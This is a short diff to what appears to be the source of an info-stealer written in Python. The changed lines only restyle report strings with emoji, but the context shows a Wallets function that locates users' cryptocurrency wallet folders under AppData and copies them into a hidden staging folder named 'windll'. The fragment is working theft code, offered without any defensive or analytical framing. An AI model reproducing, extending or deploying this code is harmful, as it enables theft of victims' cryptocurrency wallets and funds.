@@ -16,7 +16,7 @@ from shutil import copytree
 
 def Wallets(data):
     try:
-        data.append("\n\n💰Wallets")
+        data.append("\n\n\n**💰Wallets💰**")
         print("w")
         pathtofile = environ['USERPROFILE'] + sep + r'AppData\Roaming'
         pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
@@ -61,7 +61,7 @@ def Wallets(data):
                         num = wallets[i].rfind("\\")
                         #print(wallets[i][:num+1])
                         copytree(rf"{pathtofile}{wallets[i][:num+1]}",rf"{pathtofolder}\windll\wallets{wallets[i][:num+1]}")# copy dirs
-                    data.append(f"\n∟{walletsNames[i]}")
+                    data.append(f"\n∟💸{walletsNames[i]}")
                 except Exception as e:
                     print(e)
             return data
